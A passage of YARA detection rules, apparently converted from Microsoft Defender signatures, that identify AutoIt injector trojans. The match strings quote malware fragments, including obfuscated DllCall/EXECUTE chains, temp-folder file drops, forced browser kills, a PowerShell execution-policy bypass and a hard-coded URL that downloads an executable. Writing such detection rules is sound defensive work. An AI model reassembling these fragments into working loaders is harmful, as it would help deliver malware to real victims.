        $x_2_5 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 4d 00 6f 00 22 00 20 00 26 00 20 00 22 00 64 00 28 00 24 00 [0-20] 2c 00 20 00 32 00 29 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_6 = {45 58 45 43 55 54 45 20 28 20 22 4d 6f 22 20 26 20 22 64 28 24 [0-20] 2c 20 32 29 22 20 29}  //weight: 2, accuracy: Low
        $x_1_7 = {46 00 69 00 6c 00 65 00 4f 00 70 00 65 00 6e 00 [0-3] 28 00 [0-3] 40 00 54 00 65 00 6d 00 70 00 44 00 69 00 72 00 20 00 26 00 [0-4] 22 00 5c 00 [0-40] 22 00 [0-4] 2c 00 20 00 31 00 38 00 [0-3] 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {46 69 6c 65 4f 70 65 6e [0-3] 28 [0-3] 40 54 65 6d 70 44 69 72 20 26 [0-4] 22 5c [0-40] 22 [0-4] 2c 20 31 38 [0-3] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*) and 2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_5_*) and 3 of ($x_2_*))) or
            ((3 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_ASF_2147925760_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ASF!MTB"
        threat_id = "2147925760"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GLOBAL $CHROMEPATHX64 = \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" ascii //weight: 1
        $x_1_2 = "FUNC KILLOTHERPROCESSESFORCHROME ( )" ascii //weight: 1
        $x_1_3 = "RUNWAIT ( \"taskkill /F /IM msedge.exe /T\" , \"\" , @SW_HIDE )" ascii //weight: 1
        $x_1_4 = "RUNWAIT ( \"taskkill /F /IM chrome.exe /T\" , \"\" , @SW_HIDE )" ascii //weight: 1
        $x_1_5 = "RUNWAIT ( \"taskkill /F /IM brave.exe /T\" , \"\" , @SW_HIDE )" ascii //weight: 1
        $x_1_6 = "start-fullscreen --no-first-run --disable-session-crashed-bubble --disable-infobars\" , \"\" , @SW_HIDE )" ascii //weight: 1
        $x_1_7 = "SLEEP ( 3000 )" ascii //weight: 1
        $x_1_8 = "RUN ( \"\"\"\" & $EDGEPATH & \"\"\" --app=\"\"\" & $FIRSTURL & \"\"\" --start-fullscreen --disable-popup-blocking\" , \"\" , @SW_HIDE )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMZ_2147925767_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMZ!MTB"
        threat_id = "2147925767"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "http://173.201.233.47/yahoo.exe" ascii //weight: 3
        $x_1_2 = "SLEEP ( 60000 )" ascii //weight: 1
        $x_1_3 = "@STARTUPDIR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_NW_2147925964_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NW!MTB"
        threat_id = "2147925964"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_1_3 = "52110k52110e52110r52110n52110e52110l52110352110252110.52110d52110l52110l52110" ascii //weight: 1
        $x_1_4 = "52110V52110i52110r52110t52110u52110a52110l52110P52110r52110o52110t52110e52110c52110t52110" ascii //weight: 1
        $x_1_5 = "52110u52110i52110n52110t52110" ascii //weight: 1
        $x_1_6 = "52110p52110t52110r52110" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 4 of ($x_1_*))) or
            ((2 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AHDA_2147926203_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AHDA!MTB"
        threat_id = "2147926203"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "@TEMPDIR &" ascii //weight: 1
        $x_3_2 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 43 00 22 00 20 00 26 00 20 00 22 00 61 00 6c 00 6c 00 28 00 [0-20] 28 00 22 00 22 00 68 00 68 00 6f 00 71 00 62 00 22 00 20 00 26 00 20 00 22 00 6f 00 30 00 35 00 22 00 22 00 2c 00 20 00 33 00 29 00 2c 00 20 00 00 28 00 22 00 22 00 6d 00 77 00 6f 00 22 00 22 00 2c 00 20 00 33 00 29 00 2c 00 20 00 00 28 00 22 00 22 00 53 00 6c 00 6f 00 77 00 72 00 64 00 69 00 44 00 69 00 6f 00 6c 00 66 00 22 00 22 00 2c 00 20 00 33 00 29 00}  //weight: 3, accuracy: Low
        $x_3_3 = {45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 43 22 20 26 20 22 61 6c 6c 28 [0-20] 28 22 22 68 68 6f 71 62 22 20 26 20 22 6f 30 35 22 22 2c 20 33 29 2c 20 00 28 22 22 6d 77 6f 22 22 2c 20 33 29 2c 20 00 28 22 22 53 6c 6f 77 72 64 69 44 69 6f 6c 66 22 22 2c 20 33 29}  //weight: 3, accuracy: Low
        $x_3_4 = {42 00 69 00 6e 00 61 00 72 00 79 00 4c 00 65 00 6e 00 28 00 24 00 [0-20] 29 00 2c 00 20 00 [0-20] 28 00 22 00 22 00 61 00 7a 00 6c 00 75 00 61 00 22 00 22 00 2c 00 20 00 33 00 29 00 2c 00 20 00 [0-20] 28 00 22 00 22 00 2d 00 7b 00 30 00 33 00 2d 00 33 00 22 00 22 00 2c 00 20 00 33 00 29 00 2c 00 20 00 [0-20] 28 00 22 00 22 00 61 00 7a 00 6c 00 75 00 61 00 22 00 22 00 2c 00 20 00 33 00 29 00 2c 00 20 00 [0-20] 28 00 22 00 22 00 2d 00 7b 00 31 00 33 00 22 00 22 00 2c 00 20 00 33 00 29 00 29 00 5b 00 30 00 5d 00 22 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_5 = {42 69 6e 61 72 79 4c 65 6e 28 24 [0-20] 29 2c 20 [0-20] 28 22 22 61 7a 6c 75 61 22 22 2c 20 33 29 2c 20 [0-20] 28 22 22 2d 7b 30 33 2d 33 22 22 2c 20 33 29 2c 20 [0-20] 28 22 22 61 7a 6c 75 61 22 22 2c 20 33 29 2c 20 [0-20] 28 22 22 2d 7b 31 33 22 22 2c 20 33 29 29 5b 30 5d 22 20 29}  //weight: 3, accuracy: Low
        $x_2_6 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 73 00 74 00 72 00 22 00 20 00 26 00 20 00 22 00 75 00 63 00 74 00 53 00 65 00 74 00 44 00 61 00 74 00 61 00 28 00 24 00 [0-20] 2c 00 20 00 22 00 20 00 26 00 20 00 22 00 31 00 2c 00 20 00 24 00 [0-20] 29 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_7 = {45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 73 74 72 22 20 26 20 22 75 63 74 53 65 74 44 61 74 61 28 24 [0-20] 2c 20 22 20 26 20 22 31 2c 20 24 [0-20] 29 22 20 29}  //weight: 2, accuracy: Low
        $x_2_8 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 41 00 44 00 44 00 52 00 45 00 53 00 53 00 20 00 28 00 20 00 22 00 69 00 6e 00 74 00 22 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 2b 00 20 00 39 00 31 00 33 00 36 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_9 = {44 4c 4c 43 41 4c 4c 41 44 44 52 45 53 53 20 28 20 22 69 6e 74 22 20 2c 20 24 [0-20] 20 2b 20 39 31 33 36 20 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 4 of ($x_2_*))) or
            ((2 of ($x_3_*) and 2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_3_*) and 3 of ($x_2_*))) or
            ((3 of ($x_3_*) and 1 of ($x_2_*))) or
            ((4 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_KAF_2147926422_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.KAF!MTB"
        threat_id = "2147926422"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 00 44 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 43 00 61 00 22 00 20 00 26 00 20 00 22 00 6c 00 6c 00 28 00 [0-20] 28 00 22 00 22 00 6c 00 66 00 73 00 22 00 20 00 26 00 20 00 22 00 6f 00 66 00 6d 00 34 00 33 00 22 00 22 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {22 44 6c 22 20 26 20 22 6c 43 61 22 20 26 20 22 6c 6c 28 [0-20] 28 22 22 6c 66 73 22 20 26 20 22 6f 66 6d 34 33 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {22 00 44 00 6c 00 6c 00 53 00 22 00 20 00 26 00 20 00 22 00 74 00 72 00 75 00 63 00 22 00 20 00 26 00 20 00 22 00 74 00 43 00 72 00 65 00 61 00 74 00 65 00 28 00 [0-20] 28 00 22 00 22 00 63 00 7a 00 22 00 20 00 26 00 20 00 22 00 75 00 66 00 21 00 5c 00 22 00 22 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {22 44 6c 6c 53 22 20 26 20 22 74 72 75 63 22 20 26 20 22 74 43 72 65 61 74 65 28 [0-20] 28 22 22 63 7a 22 20 26 20 22 75 66 21 5c 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "\"Dll\" & \"Call(\"\"us\" & \"er32.dll\"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Trojan_Win32_AutoitInject_SKA_2147926953_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SKA!MTB"
        threat_id = "2147926953"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 46 00 69 00 6c 00 65 00 52 00 22 00 20 00 26 00 20 00 22 00 65 00 61 00 64 00 28 00 46 00 69 00 6c 00 65 00 4f 00 22 00 20 00 26 00 20 00 22 00 70 00 65 00 6e 00 28 00 40 00 54 00 65 00 6d 00 70 00 44 00 69 00 72 00 20 00 26 00 20 00 22 00 22 00 5c 00 [0-47] 22 00 22 00 29 00 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 46 69 6c 65 52 22 20 26 20 22 65 61 64 28 46 69 6c 65 4f 22 20 26 20 22 70 65 6e 28 40 54 65 6d 70 44 69 72 20 26 20 22 22 5c [0-47] 22 22 29 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 42 00 49 00 54 00 58 00 4f 00 52 00 20 00 28 00 20 00 41 00 53 00 43 00 20 00 28 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4d 00 49 00 44 00 20 00 28 00 20 00 24 00 [0-47] 20 00 2c 00 20 00 24 00 [0-47] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00 20 00 2c 00 20 00 24 00 [0-47] 20 00 29 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {26 3d 20 43 48 52 20 28 20 42 49 54 58 4f 52 20 28 20 41 53 43 20 28 20 53 54 52 49 4e 47 4d 49 44 20 28 20 24 [0-47] 20 2c 20 24 [0-47] 20 2c 20 31 20 29 20 29 20 2c 20 24 [0-47] 20 29 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = "&= EXECUTE ( \"C\" & \"h\" & \"r(As\" & \"c(St\" & \"ringMid(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Trojan_Win32_AutoitInject_AQEA_2147927209_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AQEA!MTB"
        threat_id = "2147927209"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "18"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "@TEMPDIR &" ascii //weight: 1
        $x_3_2 = "EXECUTE ( \"Fil\" & \"eR\" & \"ea\" & \"d(Fil\" & \"eOpen(@TempDir &" ascii //weight: 3
        $x_3_3 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-20] 28 00 53 00 74 00 72 00 69 00 6e 00 22 00 20 00 26 00 20 00 22 00 67 00 52 00 65 00 22 00 20 00 26 00 20 00 22 00 70 00 6c 00 61 00 63 00 65 00}  //weight: 3, accuracy: Low
        $x_3_4 = {45 58 45 43 55 54 45 20 28 20 22 [0-20] 28 53 74 72 69 6e 22 20 26 20 22 67 52 65 22 20 26 20 22 70 6c 61 63 65}  //weight: 3, accuracy: Low
        $x_3_5 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 63 00 28 00 53 00 74 00 72 00 69 00 6e 00 67 00 4d 00 69 00 64 00 28 00 24 00 [0-20] 2c 00 20 00 24 00 [0-20] 2c 00 20 00 31 00 29 00 29 00 22 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_6 = {45 58 45 43 55 54 45 20 28 20 22 41 22 20 26 20 22 73 63 28 53 74 72 69 6e 67 4d 69 64 28 24 [0-20] 2c 20 24 [0-20] 2c 20 31 29 29 22 20 29}  //weight: 3, accuracy: Low
        $x_2_7 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 72 00 28 00 24 00 [0-20] 20 00 2d 00 20 00 28 00 31 00 20 00 5e 00 20 00 24 00 [0-20] 29 00 29 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_8 = {45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 72 28 24 [0-20] 20 2d 20 28 31 20 5e 20 24 [0-20] 29 29 22 20 29}  //weight: 2, accuracy: Low
        $x_2_9 = "EXECUTE ( \"D\" & \"l\" & \"l\" & \"C\" & \"a\" & \"l\" & \"l\" &" ascii //weight: 2
        $x_2_10 = "EXECUTE ( \"D\" & \"l\" & \"l\" & \"S\" & \"truc\" & \"tC\" & \"re\" & \"at\" & \"e" ascii //weight: 2
        $x_2_11 = "EXECUTE ( \"D\" & \"l\" & \"l\" & \"S\" & \"t\" & \"ru\" & \"ct\" & \"S\" & \"etDat" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_3_*) and 4 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_3_*) and 5 of ($x_2_*))) or
            ((4 of ($x_3_*) and 3 of ($x_2_*))) or
            ((5 of ($x_3_*) and 1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((5 of ($x_3_*) and 2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_PPRH_2147927217_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.PPRH!MTB"
        threat_id = "2147927217"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "@TEMPDIR &" ascii //weight: 1
        $x_2_2 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-20] 28 00 53 00 74 00 72 00 69 00 6e 00 22 00 20 00 26 00 20 00 22 00 67 00 52 00 65 00 22 00 20 00 26 00 20 00 22 00 70 00 6c 00 61 00 63 00 65 00}  //weight: 2, accuracy: Low
        $x_2_3 = {45 58 45 43 55 54 45 20 28 20 22 [0-20] 28 53 74 72 69 6e 22 20 26 20 22 67 52 65 22 20 26 20 22 70 6c 61 63 65}  //weight: 2, accuracy: Low
        $x_3_4 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 63 00 28 00 53 00 74 00 72 00 69 00 6e 00 67 00 4d 00 69 00 64 00 28 00 24 00 [0-20] 2c 00 20 00 24 00 [0-20] 2c 00 20 00 31 00 29 00 29 00 22 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_5 = {45 58 45 43 55 54 45 20 28 20 22 41 22 20 26 20 22 73 63 28 53 74 72 69 6e 67 4d 69 64 28 24 [0-20] 2c 20 24 [0-20] 2c 20 31 29 29 22 20 29}  //weight: 3, accuracy: Low
        $x_3_6 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 72 00 28 00 24 00 [0-20] 20 00 2d 00 20 00 28 00 31 00 20 00 5e 00 20 00 24 00 [0-20] 29 00 29 00 22 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_7 = {45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 72 28 24 [0-20] 20 2d 20 28 31 20 5e 20 24 [0-20] 29 29 22 20 29}  //weight: 3, accuracy: Low
        $x_3_8 = "EXECUTE ( \"D\" & \"l\" & \"l\" & \"C\" & \"a\" & \"l\" & \"l\"" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_3_*) and 1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_3_*) and 2 of ($x_2_*))) or
            ((4 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_HNB_2147927612_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNB!MTB"
        threat_id = "2147927612"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "STRINGREPLACE ( \"pow\" & \"ersh\" & \"ell.exe\" , \"r\" , \"r\" )" ascii //weight: 1
        $x_1_2 = "\" -Ex\" & \"ecut\" & \"ionPo\" & \"licy By\" & \"pass -Fi\" & \"le \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win32_AutoitInject_HNC_2147927833_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNC!MTB"
        threat_id = "2147927833"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$PPROC = __INIT ( BINARY ( \"0x55" ascii //weight: 1
        $x_1_2 = "\"wstr\" , \"{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}\" , \"ptr\"" ascii //weight: 1
        $x_1_3 = " + -11 , CHR ( 87 ) )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_NAZ_2147928055_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NAZ!MTB"
        threat_id = "2147928055"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_1_3 = {49 00 46 00 20 00 4d 00 4f 00 44 00 20 00 28 00 20 00 24 00 [0-31] 20 00 2c 00 20 00 32 00 20 00 29 00 20 00 3d 00 20 00 30 00 20 00 54 00 48 00 45 00 4e 00}  //weight: 1, accuracy: Low
        $x_1_4 = {49 46 20 4d 4f 44 20 28 20 24 [0-31] 20 2c 20 32 20 29 20 3d 20 30 20 54 48 45 4e}  //weight: 1, accuracy: Low
        $x_1_5 = "&= EXECUTE ( \"Chr(Asc(StringMid" ascii //weight: 1
        $x_1_6 = "PolzogfGfrii" ascii //weight: 1
        $x_1_7 = "PolzogfLlk_" ascii //weight: 1
        $x_1_8 = "fx_yorn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 5 of ($x_1_*))) or
            ((2 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AYFA_2147928116_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AYFA!MTB"
        threat_id = "2147928116"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-30] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-30] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 4, accuracy: Low
        $x_1_3 = "= \"D\"" ascii //weight: 1
        $x_1_4 = "&= \"llC\"" ascii //weight: 1
        $x_1_5 = "&= \"a\"" ascii //weight: 1
        $x_2_6 = "&= \"ll(\"\"ke\"" ascii //weight: 2
        $x_1_7 = "&= \"rn\"" ascii //weight: 1
        $x_1_8 = "&= \"el3\"" ascii //weight: 1
        $x_1_9 = "&= \"2\"\", \"\"p\"" ascii //weight: 1
        $x_1_10 = "= \"Dl\"" ascii //weight: 1
        $x_1_11 = "&= \"lSt\"" ascii //weight: 1
        $x_1_12 = "&= \"ructC\"" ascii //weight: 1
        $x_2_13 = "&= \"reate(\"\"by\"" ascii //weight: 2
        $x_1_14 = "&= \"te [\"" ascii //weight: 1
        $x_4_15 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 22 00 20 00 26 00 20 00 22 00 6c 00 6c 00 53 00 74 00 72 00 22 00 20 00 26 00 20 00 22 00 75 00 63 00 74 00 53 00 65 00 22 00 20 00 26 00 20 00 22 00 74 00 44 00 22 00 20 00 26 00 20 00 22 00 61 00 74 00 61 00 28 00 24 00 [0-20] 2c 00 20 00 31 00 2c 00}  //weight: 4, accuracy: Low
        $x_4_16 = {45 58 45 43 55 54 45 20 28 20 22 44 22 20 26 20 22 6c 6c 53 74 72 22 20 26 20 22 75 63 74 53 65 22 20 26 20 22 74 44 22 20 26 20 22 61 74 61 28 24 [0-20] 2c 20 31 2c}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_4_*) and 2 of ($x_2_*) and 10 of ($x_1_*))) or
            ((3 of ($x_4_*) and 10 of ($x_1_*))) or
            ((3 of ($x_4_*) and 1 of ($x_2_*) and 8 of ($x_1_*))) or
            ((3 of ($x_4_*) and 2 of ($x_2_*) and 6 of ($x_1_*))) or
            ((4 of ($x_4_*) and 6 of ($x_1_*))) or
            ((4 of ($x_4_*) and 1 of ($x_2_*) and 4 of ($x_1_*))) or
            ((4 of ($x_4_*) and 2 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AEGA_2147928264_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AEGA!MTB"
        threat_id = "2147928264"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-30] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-30] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 4, accuracy: Low
        $x_1_3 = "= \"D\"" ascii //weight: 1
        $x_1_4 = "&= \"llS\"" ascii //weight: 1
        $x_1_5 = "&= \"tructCre\"" ascii //weight: 1
        $x_1_6 = "&= \"ate(\"\"b\"" ascii //weight: 1
        $x_2_7 = "&= \"yte[\"\" & Bin\"" ascii //weight: 2
        $x_1_8 = "&= \"llC\"" ascii //weight: 1
        $x_1_9 = "&= \"al\"" ascii //weight: 1
        $x_2_10 = "&= \"l(\"\"ke\"" ascii //weight: 2
        $x_1_11 = "&= \"rn\"" ascii //weight: 1
        $x_1_12 = "&= \"e\"" ascii //weight: 1
        $x_1_13 = "&= \"l3\"" ascii //weight: 1
        $x_1_14 = "&= \"2.\"" ascii //weight: 1
